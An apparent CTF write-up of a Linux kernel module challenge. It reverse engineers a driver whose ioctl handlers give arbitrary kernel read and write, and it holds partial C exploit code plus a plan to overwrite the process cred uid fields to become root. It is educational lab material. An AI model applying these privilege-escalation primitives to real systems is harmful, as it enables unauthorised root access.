# Baby Kernel 2 (kernel, +smep, +smap, -kaslr)

## Understanding what we are given
In this challenge we are given standard linux kernel CTF challenge setup:

```console
$ unzip baby_kernel_2_7787916f9b06d129da1aae2dc2b5f42a.zip 
Archive:  baby_kernel_2_7787916f9b06d129da1aae2dc2b5f42a.zip
   creating: public/
  inflating: public/initramfs.cpio.gz  
  inflating: public/vmlinux          
  inflating: public/System.map       
  inflating: public/bzImage          
  inflating: public/run.sh

$ ls public/
bzImage  initramfs.cpio.gz  run.sh  System.map  vmlinux
```

As this is my first kernel challenge, I will briefly describe what are all of those files for. Nnote: as this is my first challenge I might be completely wrong. I will also put some exclamation marks, but this is not because I'm so experienced, but because there is so much new stuff that I have to priorotize it.

Let's start with `bzImage` and `vmlinux`:

```console
$ file bzImage
public/bzImage: Linux kernel x86 boot executable bzImage, version 4.19.77 (sceptic@sceptic-arch) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019, RO-rootFS, swap_dev 0x1, Normal VGA

$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e611a1f0d4d255ef9bc2dfa4deca5b0fbaec1749, with debug_info, not stripped
```

As most linux programs the operating system itself is also an ELF executable. The vmlinux file is this one huge executable.

As linux kernel nowdays has 20+ milions lines of code it takes a lot of space where the space available to store the compressed kernel code is limited. This is why bzImage has been introduces. It uses smart tricks to split kernel over discontiguous memory regions.

We can confirm the size difference of the files using ls with -lh flag

```console
$ ls -lh 
-rw-r--r-- 1 k k 1,9M paź 21 22:41 bzImage
-rw-r--r-- 1 k k 68M paź 21 22:41 vmlinux
```

Ok, but if `bzImage` is just smarter way of storing operating system than `vmlinux` then why are we given both files?
Well, the challenge itself uses only `bzImage`, but the `vmlinux` was provided to help us with the challenge. It can help out with debuging, searching for gadgets and looking for symbols. We will use it later on.

Note: you can extract the vmlinux yourself using `extract-vmlinux` script. You can read how to do this [here](https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/)

If we are speaking about files which are left only for us, then this is right place to introduce System.map. It is just a symbol to address mapping. By symbols I mean functions and global variables:

```console
$ cat System.map | head -10
0000000001000000 A phys_startup_64
ffffffff030f5000 A init_per_cpu__gdt_page
ffffffff03122000 A init_per_cpu__irq_stack_union
ffffffff81000000 T _stext
ffffffff81000000 T _text
ffffffff81000000 T startup_64
ffffffff81000030 T secondary_startup_64
ffffffff810000e0 T verify_cpu
ffffffff810001e0 T __startup_64
ffffffff810003b0 T __startup_secondary_64
```

Note: System.map can be found inside /boot/System.map-$(uname -r).


Then we have `initramfs.cpio.gz`. It contains packed filesystem. We will find there often `flag` file and source or at least binaries of vulnerable `modules`.

Let's check what's inside of provided initramfs.cpio.gz by extracting it:

```console
$ mkdir extracted
$ cd extracted
$ zcat ../initramfs.cpio.gz | cpio -idmv
.
bin
bin/busybox
client_kernel_baby_2
etc
etc/group
etc/inittab
etc/passwd
etc/shadow
flag
home
home/user
init
lib
lib/modules
lib/modules/4.19.77
lib/modules/4.19.77/kernel_baby_2.ko
proc
root
sys
usr
usr/bin
usr/sbin
usr/share
var
7393 blocks
k@c:~/tmp/public/extracted$ ls
bin  client_kernel_baby_2  etc  flag  home  init  lib  proc  root  sys  usr  var
```

See? A proper filesystem! Except of well known folders like /etc, /home we can directly spot `flag`, `init`, `lib/modules/4.19.77/kernel_baby_2.ko` and `client_kernel_baby_2` binaries. We will speak about them in a bit. For now just note that you should alwJustays look inside `initramfs.cpio.gz`!

Let's move to `run.sh` script:

```bash
DIR="$(dirname "$(readlink -f "$0")")"
qemu-system-x86_64 -monitor /dev/null \
    -cpu max,+smap,+smep,check \
    -m 64 -nographic \
    -kernel "$DIR/bzImage" \
    -initrd "$DIR/initramfs.cpio.gz" \
    -append "console=ttyS0 init='/init'"
```

all it does it runs the linux vm.

It also specifies some general options like:
- `-nographic` which will run the vm without GUI
- `-m 64` which limits virtual ram to 64 megabytes
- `-monitor /dev/null` which redirects the monitor to /dev/null as we don't want to interact with qemu options outside of run.sh

Besides that we can find already known:
- `-kernel "$DIR/bzImage"` which tells the qemu to use bzImage as kernel image
- `"$DIR/initramfs.cpio.gz"` which tells the qemu to use initramfs.cpio.gz as source for filesystem

Finally we have:
- `-append "console=ttyS0 init='/init'"`
option which tells qemu to open console and run `init` file.

I bet this is a lot for you (it was for me), and so for now you should only be looking for keywords such as: smep, smap, kaslr. This are the software and hardware protections and so our attack technique will depend on whether they are enabled or disabled.
Here we have smep and smap enabled and kaslr is disabled. I will explain them later on when we reach exploit phase.

We are left with last, `init` script which we found in extracted `initramfs.cpio.gz`. I really don't want to overhelm you so I will only focus on most important parts.

```
#!/bin/busybox sh
# /bin/sysinfo

/bin/busybox --install /bin
/bin/mkdir /sbin
/bin/busybox --install /sbin

export PATH="/bin;$PATH"
export LD_LIBRARY_PATH="/lib"

mkdir -p /dev /sys /proc /tmp

mount -t devtmpfs none /dev
mount -t sysfs sys /sys
mount -t proc proc /proc
mount -t tmpfs none /tmp

# chown
chown -R 0:0  /bin /etc /home /init /lib /root /tmp /var
chown -R 1000:1000 /home/user
chown 0:0 / /dev /proc /sys
chown 0:0 /flag

# chmod
chmod -R 700 /etc /home /root /var
chmod -R 755 /bin /init /lib
chmod -R 1777 /tmp
chmod 755 /
chmod 755 /etc
chmod 744 /etc/passwd /etc/group
chmod 755 /home
chmod 700 /etc/shadow

chmod 700 /flag

mkdir -p /lib/modules/$(uname -r)

insmod "/lib/modules/$(uname -r)/kernel_baby_2.ko"
chmod +rw /dev/flux_baby_2
chmod +x /client_kernel_baby_2

sleep 2

su user -c /client_kernel_baby_2

# /bin/sh

poweroff -f -n -d 0
```

This script is run just after linux boots. It runs with root privilages. It creates two users (a root user: root and a normal unprivilage user: user), then sets permissions (chmod, chown) to files (ex. so that only root can read /flag).

### Modules
Then there is perhaps a new instruction for you called insmod:

```bash
insmod "/lib/modules/$(uname -r)/kernel_baby_2.ko"
chmod +rw /dev/flux_baby_2
chmod +x /client_kernel_baby_2
```

Before I explain above instructions this is a right place to understand how (at least not advanced) kernel exploitation challenges are build. It might be confusing that we are exploiting a linux kernel but does it means that someone want's us to find a 0day? NO. Most challenges focus on exploiting modules. Linux supports adding your own chunk of code that can use kernel functions and globals but doesn't require kernel recompilation or reboot. The modules run inside kernel and so pose a great attack target for hackers.

A simple hello world module can look like:

```c
// hello.c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
	printk(KERN_INFO "Hello world\n");
	return 0;
}

void cleanup_module(void) {
	printk(KERN_INFO "Goodbye world\n");
}

module_init(init_module);
module_exit(cleanup_module);
```

all it has to have is a constructor `init_module` and destructor `cleanup_module`. Then you specify which function is a constructor and which is a destructor with filling `module_init` and `module_exit` macros.

You compile module with simple Kbuild:

```makefile
# Makefile
obj-m += hello.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
``` 

using make command and load it using `insmod` command. To remove it you use `rmmod` command.

```console
# make
...
# insmod hello.ko
# dmesg
Hello world
# rmmod hello.ko
# dmesg
Hello world
Goodbye world
```

How can you communicate with module from code? Well, they usually come with char devices. They are placed inside /dev folder.

## Challenge itself
In this challenge we found 3 files inside initramfs.cpio.gz:
- lib/modules/4.19.77/kernel_baby_2.ko: kernel module binary. This file perhaps contains the vulnerability and in the end we will have to exploit it. It runs inside kernel so when exploited we can gain privilages escalation :)
- /dev/flux_baby_2: a char device used to communicate with the module. Standard functions to communicate with it are: `open`, `close`, `read`, `write`, `llseek`, `ioctl`.
- client_kernel_baby_2: in this specific challenge we cannot communicate with a char device as a user (chown 0:0 /dev in init file). But we can run ./client_kernel_baby_2 program which just wraps the `open`, `close`, ..., `ioctl` functions and invokes them on `/dev/flux_baby_2`. This means that our exploit will just communicate with this binary.

So we have two files to reverse engineer: `client_kernel_baby_2` and `kernel_baby_2.ko`. 

When running `./run.sh` the `client_kernel_baby_2` program will be run in the console right after kernel boots. 

```console
$ ./run.sh 
Linux version 4.19.77 (sceptic@sceptic-arch) (gcc version 9.2.0 (GCC)) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019
Command line: console=ttyS0 init='/init'
x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[...]
clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x19f2010fc46, max_idle_ns: 440795276803 ns
clocksource: Switched to clocksource tsc
flux_baby_2 opened
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 
```

This is because of the `su user -c /client_kernel_baby_2` placed at the end of `init` file. As I prefer to have more control I started with commenting this line and uncommenting shell: /bin/bash.

```console
$ cat init | tail -8

sleep 2

# su user -c /client_kernel_baby_2

/bin/sh

poweroff -f -n -d 0
```

Now we have to pack our updated initramfs.cpio.gz. We can do this by using this command:

```console
$ cd extracted

$ find . -print0 | cpio --null -ov --format=newc | gzip -9 >../initramfs.cpio.gz
.
./initramfs.cpio.gz
./extracted
[...]
./bzImage
./System.map
./run.sh
155123 blocks
```

And let's run ./run.sh again:

```console
$ ./run.sh
Linux version 4.19.77 (sceptic@sceptic-arch) (gcc version 9.2.0 (GCC)) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019
Command line: console=ttyS0 init='/init'
[...]
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
```

Oh, we are root as well! Well yes, baceuse init script runs with root privilages. Of course this won't be possible on challenge server where we cannot modify `./run.sh` file. But it is a good idea to modify init localy and log in as root as we gain access to useful debugging stuff like: dmesg, /proc/kallsyms, etc.

Before we run ./client_kernel_baby_2 let's downgrade our permissions for a moment to become user.
Now let's run ./client_kernel_baby_2:

```console
# su user
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

$ ./client_kernel_baby_2
flux_baby_2 opened
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 4
Which file are we trying to read?
> /etc/passwd
Here are your 0x47 bytes contents: 
root:x:0:0:root:/root:/bin/sh
user:x:1000:1000:user:/home/user:/bin/sh
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 4
> /flag
Could not open file for reading...
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 3
uid=1000(user) gid=1000(user) groups=1000(user)
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 1
I need an address to read from. Choose wisely
> 
0
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
BUG: unable to handle kernel NULL pointer dereference at 0000000000000000
PGD 33c3067 P4D 33c3067 PUD 33c2067 PMD 0 
Oops: 0000 [#1] PREEMPT NOPTI
CPU: 0 PID: 62 Comm: client_kernel_b Tainted: G           O      4.19.77 #2
RIP: 0010:read+0x2a/0x40 [kernel_baby_2]
Code: 55 48 89 fe ba 10 00 00 00 48 89 e5 48 83 ec 18 48 8d 7d f0 e8 07 64 11 e1 48 8b 45 f0 48 8b 7d f8 48 8d 75 e8 ba 08 00 00 00 <48> 8b 00 48 89 45 e8 e8 ba 63 11 e1 31 c0 c9 c3 66 0f 1f 44 00 00
RSP: 0018:ffffc900000c7e18 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 0000000000000385 RCX: 0000000000000000
RDX: 0000000000000008 RSI: ffffc900000c7e18 RDI: 00007fff7ebc06b8
RBP: ffffc900000c7e30 R08: 00007fff7ebc06b8 R09: 00000000000000da
R10: 0000000000000007 R11: 0000000000000000 R12: 00007fff7ebc0670
R13: ffff88800349bc00 R14: 00007fff7ebc0670 R15: ffff88800338c400
FS:  0000000001ac2880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000000 CR3: 00000000033c0000 CR4: 00000000005406b0
PKRU: 55555554
Call Trace:
 driver_ioctl+0x52/0xf2e [kernel_baby_2]
 do_vfs_ioctl+0x414/0x620
 ksys_ioctl+0x3c/0x80
 ? ksys_write+0x4a/0xc0
 __x64_sys_ioctl+0x15/0x20
 do_syscall_64+0x44/0x1c0
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x4502eb
Code: 0f 97 c0 84 c0 75 b0 49 8d 3c 1c e8 1f 4c 03 00 85 c0 78 b1 48 83 c4 08 4c 89 e0 5b 41 5c c3 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fff7ebc0648 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
RAX: ffffffffffffffda RBX: 00000000004004a0 RCX: 00000000004502eb
RDX: 00007fff7ebc0670 RSI: 0000000000000385 RDI: 0000000000000003
RBP: 00007fff7ebc0690 R08: 0000000000000024 R09: 7265766520746f47
R10: 4920676e69687479 R11: 0000000000000246 R12: 00000000004032b0
R13: 0000000000000000 R14: 00000000004ca018 R15: 0000000000000000
Modules linked in: kernel_baby_2(O)
CR2: 0000000000000000
---[ end trace db070858655dba27 ]---
RIP: 0010:read+0x2a/0x40 [kernel_baby_2]
Code: 55 48 89 fe ba 10 00 00 00 48 89 e5 48 83 ec 18 48 8d 7d f0 e8 07 64 11 e1 48 8b 45 f0 48 8b 7d f8 48 8d 75 e8 ba 08 00 00 00 <48> 8b 00 48 89 45 e8 e8 ba 63 11 e1 31 c0 c9 c3 66 0f 1f 44 00 00
RSP: 0018:ffffc900000c7e18 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 0000000000000385 RCX: 0000000000000000
RDX: 0000000000000008 RSI: ffffc900000c7e18 RDI: 00007fff7ebc06b8
RBP: ffffc900000c7e30 R08: 00007fff7ebc06b8 R09: 00000000000000da
R10: 0000000000000007 R11: 0000000000000000 R12: 00007fff7ebc0670
R13: ffff88800349bc00 R14: 00007fff7ebc0670 R15: ffff88800338c400
FS:  0000000001ac2880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000000 CR3: 00000000033c0000 CR4: 00000000005406b0
PKRU: 55555554
flux_baby_2 closed
Killed
```

The program let's us to:
- check our id,
- read a file: we first read /etc/passwd and then /flag file. As expected we can read /etc/passwd but as a user we don't have enough permissions to read a /flag file.
- perform read operation,
- perform write operation

We can guess that we have to use read & write operations to escalate our privilages to root to read a /flag file.
We also saw that when trying to perform read operation we got a kernel panic message Oops with: 
`BUG: unable to handle kernel NULL pointer dereference` message. It means that kernel tried to access/write on invalid memory. More informations we can get from 000 which are in `Oops: 0000 [#1] PREEMPT NOPTI` message. They are defined [here](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/traps.h#L167) as:

```c
//  arch/x86/mm/fault.c
/*
 * Page fault error code bits:
 *
 *   bit 0 ==    0: no page found   1: protection fault
 *   bit 1 ==    0: read access     1: write access
 *   bit 2 ==    0: kernel-mode access  1: user-mode access
 *   bit 3 ==               1: use of reserved bit detected
 *   bit 4 ==               1: fault was an instruction fetch
 */
 ```

So in our case we can read our kernel panic as:
"Kernel tried to read a page that could not be found".
Besides that we have all registers states and call trace.

But let's not be guessing to much and let's open `client_kernel_baby_2` under Ghidra. We want to check what caused a kernel panic.

We start with reconstructing main:

```c
int main()
{
  int fd;
  uint *puVar1;
  ulong cmd;
  
  fd = open("/dev/flux_baby_2" ,0); // [0]
  do {
    menu();
    cmd = read_num(); // [1]
    switch(cmd) {
    default:
      puts("Did not understand your input...");
      return 0;
    case 1:
      do_read(fd); // [2]
      break;
    case 2:
      do_write(fd);
      break;
    case 3:
      system("id");
      break;
    case 4:
      do_readfile();
      break;
    case 5:
      do_hint();
      break;
    case 6:
      close(fd);
      puts("Bye!");
      return 0;
    }
  } while( true );
}
```

The program:
- [0] starts with opening a `/dev/flux_baby_2` char device
- [1] reads user command
- [2] in our case it executes do_read(fd)

So let's check `do_read`:

```c
void do_read(int fd) {
  void* read_to;
  void *read_from_addr;
  
  read_to = 0xdeadbeefdeadbeef;
  
  puts("I need an address to read from. Choose wisely\n> ");
  read_from_addr = read_num();
  
  puts("Got everything I need. Let\'s do it!");
  ioctl_read(fd,read_from_addr,&read_to);
  
  printf("We\'re back. Our scouter says the power level is: %016lx\n",read_to);
  
  return;
}
```

it is very simple. It asks user for an address he wants to read from and ivokes ioctl_read():

```c
#define READ_CMD 0x385

struct read_arg_t {
  void* from;
  void* to;
};

void ioctl_read(int fd, void *read_from_addr, void *read_to) {
  struct read_arg_t read_arg;
  read_arg->from = read_from_addr;
  read_arg->to = read_to;

  ioctl(fd, READ_CMD, &read_arg);
}
```

Ok, so all `client_kernel_baby_2` did was to retrieve an address a user wants to read from and then invoked `ioctl` on `/dev/flux_baby_2`.
The second argument to ioctl is a cmd. The convension is that ioctl is just a switch based on required cmd argument. 

Now let's open `kernel_baby_2` in Ghidra to follow the flow:

```c
#define READ_CMD 0x385
#define WRITE_CMD 0x386

struct read_arg_t {
  void* from;
  void* to;
};

struct write_arg_t {
  void* ptr;
  void* val;
};

long driver_ioctl(struct file *flip_1, ulong cmd, ulong arg) {
  printk("flux_baby_2 ioctl nr %d called\n", cmd);

  switch (cmd) {
    case READ_CMD:
      dread((struct read_arg_t*) arg);
      break;

    case WRITE_CMD:
      dwrite((struct write_arg_t*) arg);
      break;
  }

  return 0;
}
```

So as I've mentioned above, the ioctl is a one big switch depending on a cmd. The arg argument is usually a pointer to other arguents. In case of READ_CMD it is a `struct read_arg_t *` and in case of WRITE_CMD is is a `struct write_arg_t *`.

As we are still trying to understand why kernel panic occured, we need to check `dread` function:

```c
void dread(struct read_arg_t *read_arg) {
  struct read_arg_t read_arg_kernel;
  unsigned long val;
  
  _copy_from_user(&read_arg_kernel, read_arg, sizeof(struct read_arg_kernel)); // [0]

  val = *(unsigned long) read_arg_kernel.from; // [1]

  _copy_to_user(read_arg_kernel.to, &val, sizeof(val)); // [2]
}
```

copy_from_user and copy_to_user are standard kernel functions. When you are writing kernel code you must not access user data directly at it could lead to serious security issues. So in [0] kernel just copies the user argument to his own local variable `read_arg_kernel`. Then in [1] kernel reads a value under address a user specified and finaly in [2] he copies this value back to userspace.

As we have provided value 0 the kernel tried in [1] to read a value under this address and of course this is an invalid instruction which caused kernel panic.

Hmm, but this means that we can read values at any address we want! Not only from user but also from kernel space! This is for sure a big security issue which we will take advantage of!

As at the time of writing there is no working netcat server I will write an exploit in c which will directly exploit the kernel module without touching the `client_kernel_baby_2`. This won't spoil the task, but simulate real privilage escalation from user to root account. Of course we need to change the setup for this. Just change permissions of /dev/flux_baby_2 inside init file.

Let's implement a general function for reading an address by using ioctl function of /dev/flux_baby char device:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

struct read_arg_t {
    char* from;
    char* to;
};

int fd;

int driver_read(void* to, void* from) {
    int err;
    struct read_arg_t read_arg;
    
    read_arg.from = from;
    read_arg.to = to;

    err = ioctl(fd, COPY_REQUEST, &read_arg);
    if (err < 0) {
        perror("[-] ioctl COPY_REQUEST\n");
        goto fail;
    }
    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);

    return 0;
fail:
    return -1;
}


int main() {
    int err;

    fd = open("/dev/flux_baby_2", O_RDWR, 0);
    if (fd < 0) {
        perror("[-] open /dev/flux_baby_2\n");
        goto fail;
    }
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    close(fd);
    return 0;

fail:
    return -1;
}
```

Reading address of our choice gives as a lot of power, but won't be enough. This means that we need to find something more. Let's check second command implementation which is `dwrite`:

```c
void dwrite(struct write_arg_t *write_arg) {
  struct write_arg_t write_arg_kernel;

  _copy_from_user(&write_arg, write_arg, sizeof(struct write_arg_t));
  *(unsigned long) write_arg_kernel.ptr = write_arg_kernel.val;
}
```

So `dwirte` just writes user provided value to user provided address. This is amazing. We just got arbitrary write in kernel space. Before we find a way to use it, let's add write to our exploit:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

struct read_arg_t {
    char* from;
    char* to;
};

struct write_arg_t {
    char *ptr;
    unsigned long val;
};

int fd;

int driver_read(void* to, void* from) {
    int err;
    struct read_arg_t read_arg;
    
    read_arg.from = from;
    read_arg.to = to;

    err = ioctl(fd, COPY_REQUEST, &read_arg);
    if (err < 0) {
        perror("[-] ioctl COPY_REQUEST\n");
        goto fail;
    }
    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);

    return 0;
fail:
    return -1;
}

int driver_write(void *ptr, unsigned long val) {
    int err;
    struct write_arg_t write_arg;

    write_arg.ptr = ptr;
    write_arg.val = val;

    err = ioctl(fd, WRITE_REQUEST, &write_arg);
    if (err < 0) {
        perror("[-] ioctl WRITE_REQUEST\n");
        goto fail;
    }
    printf("[+] Set value under address: %p to val: %lu\n", ptr, val);

    return 0;
fail:
    return -1;
}

int main() {
    int err;

    fd = open("/dev/flux_baby_2", O_RDWR, 0);
    if (fd < 0) {
        perror("[-] open /dev/flux_baby_2\n");
        goto fail;
    }
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    close(fd);
    return 0;

fail:
    return -1;
}
```

Now the question is. What can we do having arbitrary read and write? We still do not control $rip, but do we have to? No. As you can read in [here](https://github.com/kscieslinski/CTF/tree/master/notes/permissions#kernel-structures--capabilities) kernel allocated struct task_struct for each process. This structure keeps most relevant informations about a process. One of the informations is a pointer to `cred` structure. In the `cred` structure we have field such as: `uid`, `guid`, `suid`, `sgid` etc. We all know that root has all those fields set to 0, and our unprivilaged user has them set to 1000. So what we can actually do is to set them to 0. All we need to get is an address of those fields!




## References
- https://www.tldp.org/LDP/lkmpg/2.6/html/x181.html
- https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
- http://eternal.red/2019/sloppy-dev-writeup/